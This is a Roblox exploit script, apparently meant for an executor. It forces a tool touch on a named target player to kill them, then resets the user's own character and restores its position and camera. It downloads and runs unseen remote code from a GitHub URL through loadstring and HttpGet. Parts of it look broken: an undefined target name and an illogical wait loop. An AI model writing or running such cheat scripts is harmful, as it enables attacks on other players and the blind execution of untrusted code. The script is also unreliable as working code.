local savedPos
local savedCam
local player = game:GetService("Players").LocalPlayer
local playerChar = player.Character
local playerHum = playerChar.Humanoid
target = game:GetService("Players")[targetName]
local tool = player.Backpack:FindFirstChildOfClass("Tool")
local playerPos = playerChar.HumanoidRootPart.CFrame

while not player and not playerChar and not playerHum and not tool do
    wait()
end
loadstring(game:HttpGet("https://raw.githubusercontent.com/Lvsyyy/Fun/main/Rescale"))()
playerChar.Animate.Disabled = true
playerHum.Parent = nil
playerHum.Parent = player.Character
tool.Parent = player.Character
firetouchinterest(target.Character.HumanoidRootPart, tool.Handle, 0);
player.Character.Humanoid.Health = 0
savedPos = player.Character.HumanoidRootPart.CFrame
savedCam = workspace.CurrentCamera.CFrame
if game.PlaceId == 6708206173 then
    game:GetService("ReplicatedStorage"):WaitForChild("RequestRespawn"):FireServer()
end
wait(0.6)
game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = playerPos
player.Character.HumanoidRootPart.CFrame = savedPos
workspace.CurrentCamera.CFrame = savedCam
